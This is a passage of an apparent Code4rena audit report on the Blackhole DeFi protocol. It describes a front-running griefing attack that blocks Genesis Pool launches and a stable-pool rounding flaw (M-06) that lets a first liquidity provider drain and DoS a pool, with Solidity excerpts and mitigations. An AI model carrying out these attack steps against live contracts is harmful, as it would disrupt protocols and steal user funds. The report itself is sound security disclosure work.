dark-default-dark\" data-language=\"solidity\" data-index=\"28\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edepositNativeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eauctionIndex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisPoolInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenAllocation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eallocationInfo\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//.................code\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_fundingToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_stable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;!ZV\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_fundingToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;!ZV\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//........................more code\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Scenario:\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eAn attacker can observe a pending \u003ccode\u003ecreateGenesisPool\u003c/code\u003e transaction (or the \u003ccode\u003eGenesisCreated\u003c/code\u003e event). The attacker can:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCall \u003ccode\u003epairFactory.createPair(nativeToken\u003c/code\u003e, \u003ccode\u003efundingToken\u003c/code\u003e, \u003ccode\u003estable\u003c/code\u003e) to create a new, empty LP pair for the target tokens.\u003c/li\u003e\n\u003cli\u003eImmediately after, transfer a minimal non-zero amount (e.g., 1 wei) of both \u003ccode\u003enativeToken\u003c/code\u003e and \u003ccode\u003efundingToken\u003c/code\u003e directly to this newly created pair contract address.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"impact-4\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eWhen the legitimate depo\u003ccode\u003esitNativeToken transaction executes,\u003c/code\u003epairFactory.getPair\u003ccode\u003ewill return the attacker's pair address. The require\u003c/code\u003e(IERC20(token).balanceOf(pairAddress) == 0, “!ZV”);\u003ccode\u003echecks will then fail because the pair now holds a non-zero balance of tokens. This causes the legitimate\u003c/code\u003edepositNativeToken` transaction to revert, resulting in:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDenial of Service (DoS): Legitimate projects are repeatedly blocked from launching their intended Genesis Pools.\u003c/li\u003e\n\u003cli\u003eGriefing: An attacker can perform this attack with minimal gas cost, making it a highly effective and low-cost method to disrupt the protocol’s core functionality.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd pair ownership or Origin validation. Instead of just checking \u003ccode\u003ebalance == 0\u003c/code\u003e, validate that your protocol created the pair, or that the pair was expected.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Unmitigated. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-40\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-17\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-57\"\u003emaxvzuvex\u003c/a\u003e, and also included in the \u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e section below.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-06-first-liquidity-provider-can-dos-the-pool-of-a-stable-pair\" style=\"position:relative;\"\u003e\u003ca href=\"#m-06-first-liquidity-provider-can-dos-the-pool-of-a-stable-pair\" aria-label=\"m 06 first liquidity provider can dos the pool of a stable pair permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-185\"\u003e[M-06] First liquidity provider can DOS the pool of a stable pair\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-187\"\u003eZZhelev\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-461\"\u003ecu5t0mpeo\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L481\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L481\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L344\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L344\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-4\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-4\" aria-label=\"finding description 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eRounding errors in the calculation of the invariant \u003ccode\u003ek\u003c/code\u003e can result in zero value for stable pools, allowing malicious actors to DOS the pool.\u003c/p\u003e\n\u003cp\u003eIn the \u003ccode\u003ePair\u003c/code\u003e contract, the invariant \u003ccode\u003ek\u003c/code\u003e of a stable pool is calculated as follows:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_k\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_x\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edecimals0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_y\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edecimals1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    @\u0026gt;\u0026gt;     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_a\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_x\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_y\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_b\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_x\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_x\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_y\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_y\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_a\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_b\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// x3y+y3x \u0026gt;= k\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// xy \u0026gt;= k\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe value of \u003ccode\u003e_a = (x * y) / 1e18\u003c/code\u003e becomes zero due to rounding errors when \u003ccode\u003ex * y \u0026#x3C; 1e18\u003c/code\u003e. This rounding error can result in the invariant k of stable pools equaling zero, allowing a trader to steal the remaining assets in the pool. A malicious first liquidity provider can DOS the pair by:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMinting a small amount of liquidity to the pool.\u003c/li\u003e\n\u003cli\u003eStealing the remaining assets in the pool.\u003c/li\u003e\n\u003cli\u003eRepeating steps 1 and 2 until the total supply overflows.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"impact-5\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003ePool will be DOSsed for other users to use.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"30\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction mint(address to) external lock returns (uint liquidity) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (uint _reserve0, uint _reserve1) = (reserve0, reserve1);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint _balance0 = IERC20(token0).balanceOf(address(this));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint _balance1 = IERC20(token1).balanceOf(address(this));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint _amount0 = _balance0 - _reserve0;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint _amount1 = _balance1 - _reserve1;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        if (_totalSupply == 0) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            liquidity = 